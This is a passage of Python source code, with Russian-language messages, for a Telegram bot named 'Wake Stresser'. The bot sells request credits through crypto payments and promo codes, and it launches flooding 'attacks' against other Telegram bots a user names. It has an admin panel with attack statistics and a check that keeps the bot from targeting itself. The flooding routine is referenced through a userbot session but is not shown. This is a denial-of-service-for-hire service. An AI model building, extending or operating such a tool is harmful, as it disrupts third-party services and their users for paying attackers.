            f"👑 **Панель администратора**\n\n"
            f"👥 Пользователей: {stats['total_users']}\n"
            f"🔥 Активных: {stats['active_users']}\n"
            f"📊 Всего запросов: {stats['total_requests']}\n"
            f"⚡ Использовано: {stats['total_used']}\n"
            f"💰 Доход: ${stats['total_income']:.2f}\n"
            f"🎯 Атак: {stats['total_attacks']}\n\n"
            f"📅 Новых сегодня: {stats['new_users_today']}\n"
            f"⚡ Атак сегодня: {stats['attacks_today']}\n\n"
            f"💳 Crypto Pay: {'✅' if CRYPTO_PAY_TOKEN else '❌'}",
            buttons=[
                [Button.inline("🎁 Выдать запросы", b"admin_give")],
                [Button.inline("✨ Создать промокод", b"admin_promo")],
                [Button.inline("📊 Статистика", b"admin_stats")],
                [Button.inline("👥 Пользователи", b"admin_users")],
                [Button.inline("🔙 Назад", b"main_menu")]
            ]
        )
    
    async def check_subscription(self, user_id: int):
        """Проверка подписки на канал"""
        try:
            channel = await self.bot.get_entity(CHANNEL_USERNAME)
            participant = await self.bot.get_permissions(channel, user_id)
            return participant.is_participant
        except Exception as e:
            logger.error(f"Check subscription error: {e}")
            return False
    
    async def check_bio(self, user_id: int):
        """Проверка описания профиля"""
        try:
            user_full = await self.bot(GetFullUserRequest(user_id))
            bio = user_full.about or ""
            return '@WakeStresserBot' in bio
        except Exception as e:
            logger.error(f"Check bio error: {e}")
            return False
    
    async def start(self):
        """Запуск бота"""
        # Запускаем юзербота
        await self.userbot.start()
        logger.info("✅ Userbot started")
        
        # Инициализируем стрессер
        self.stresser = BotStresser(self.userbot)
        
        # Запускаем вебхук сервер
        if CRYPTO_PAY_TOKEN:
            asyncio.create_task(self.start_webhook_server())
            logger.info("✅ Webhook server started")
        
        # Регистрируем обработчики команд
        @self.bot.on(events.NewMessage)
        async def command_handler(event):
            text = event.message.text or ""
            
            # Команды стресса
            if text.startswith('@') and ' ' in text:
                await self.handle_stress_command(event, text)
            
            # Промокоды
            elif text.upper().startswith('PROMO '):
                await self.handle_promo_command(event, text)
            
            # Админ команды
            elif event.sender_id == ADMIN_ID:
                await self.handle_admin_command(event, text)
        
        logger.info("✅ Bot starting...")
        print("""
        ╔══════════════════════════════════╗
        ║    WAKE STRESSER BOT             ║
        ║    💎 Ready to use!              ║
        ╚══════════════════════════════════╝
        """)
        
        await self.bot.run_until_disconnected()
    
    async def handle_stress_command(self, event, text: str):
        """Обработка команды стресса"""
        user = self.db.get_user(event.sender_id)
        if not user or user['requests_balance'] <= 0:
            return
        
        parts = text.split()
        if len(parts) < 2:
            return
        
        bot_username = parts[0].replace('@', '')
        
        # Защита от дурака
        if any(x in bot_username.lower() for x in ['wake', 'stress', 'stresser']):
            await event.respond(
                "❌ **Защита от дурака**\n\n"
                "К сожалению, отправить запрос на нашего бота невозможно.\n"
                "Мы защищены от самосаботажа! 😉"
            )
            return
        
        try:
            requests = int(parts[1])
            method = parts[2] if len(parts) > 2 else "mixed"
            
            if user['requests_balance'] < requests:
                await event.respond(
                    f"❌ Недостаточно запросов!\n"
                    f"Нужно: {requests}, есть: {user['requests_balance']}"
                )
                return
            
            # Запускаем атаку
            result = await self.stresser.stress_bot(bot_username, requests, method)
            
            if result['success']:
                # Списание баланса
                self.db.use_requests(event.sender_id, requests)
                
                # Сохраняем атаку в БД
                self.db.create_attack(
                    result['attack_id'],
                    event.sender_id,
                    bot_username,
                    requests,
                    requests * REQUEST_DURATION,
                    method
                )
                
                await event.respond(
                    f"✅ **Атака запущена!**\n\n"
                    f"🎯 Цель: @{bot_username}\n"
                    f"📊 Запросов: {requests}\n"
                    f"⏱️ Длительность: {requests * REQUEST_DURATION} сек\n"
                    f"⚡ Метод: {method}\n"
                    f"🆔 ID: `{result['attack_id']}`\n\n"
                    f"Баланс списан: {requests} запросов"
                )
            else:
                await event.respond(f"❌ Ошибка: {result['error']}")
                
        except ValueError:
            await event.respond("❌ Неверный формат количества запросов!")
        except Exception as e:
            await event.respond(f"❌ Ошибка: {str(e)}")
    
    async def handle_promo_command(self, event, text: str):
        """Обработка промокода"""
        user = self.db.get_user(event.sender_id)
        if not user:
            return
        
        try:
            code = text.split()[1]
            requests = self.db.use_promo_code(event.sender_id, code)
            
            if requests:
                self.db.add_requests(event.sender_id, requests)
                await event.respond(
                    f"🎁 **Промокод активирован!**\n\n"
                    f"Код: `{code}`\n"
                    f"🎁 Получено: {requests} запросов\n"
                    f"📊 Новый баланс: {user['requests_balance'] + requests}"
                )
            else:
                await event.respond("❌ Промокод недействителен или уже использован!")
        except:
            await event.respond("❌ Неверный формат промокода!")
    
    async def handle_admin_command(self, event, text: str):
        """Обработка админ команд"""
        # Выдача запросов
        if text.upper().startswith('GIVE '):
            try:
                parts = text.split()
                if len(parts) != 3:
                    await event.respond("❌ Формат: GIVE user_id количество")
                    return
                
                target = parts[1]
                requests = int(parts[2])
                
                # Определяем user_id
                if target.startswith('@'):
                    user_entity = await self.bot.get_entity(target)
                    target_id = user_entity.id
                else:
                    target_id = int(target)
                
                self.db.add_requests(target_id, requests)
                
                await event.respond(
                    f"✅ Запросы выданы!\n"
                    f"👤 Пользователь: {target_id}\n"
                    f"🎁 Запросов: {requests}"
                )
            except Exception as e:
                await event.respond(f"❌ Ошибка: {str(e)}")
        
        # Создание промокода
        elif text.upper().startswith('PROMO '):
            try:
                parts = text.split()
                if len(parts) != 4:
                    await event.respond("❌ Формат: PROMO код запросы использования")
                    return
                
                code = parts[1]
                requests = int(parts[2])
                uses = int(parts[3])
                
                self.db.create_promo_code(code, requests, uses, ADMIN_ID)
                
                await event.respond(
                    f"✨ **Промокод создан!**\n\n"
                    f"Код: `{code}`\n"
                    f"🎁 Запросов: {requests}\n"
                    f"🔄 Использований: {uses}\n\n"
                    f"Для активации: `PROMO {code}`"
                )
            except Exception as e:
                await event.respond(f"❌ Ошибка: {str(e)}")

# ==================== ЗАПУСК ====================
async def main():
    bot = WakeStresserBot()
    
    try:
        await bot.start()
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен")
    except Exception as e:
        logger.error(f"Bot error: {e}")
    finally:
        bot.db.close()

if __name__ == "__main__":
    # Проверка обязательных настроек
    required = [API_ID, API_HASH, BOT_TOKEN, STRESSER_SESSION_STRING]
    
    if not all(required):
        print("❌ ОШИБКА: Заполни все настройки в начале файла!")
        print("1. API_ID и API_HASH - получи на my.telegram.org")
        print("2. BOT_TOKEN - получи у @BotFather")
        print("3. STRESSER_SESSION_STRING - твоя StringSession")
        exit(1)
    
    print("🚀 Запускаю бота...")
    asyncio.run(main())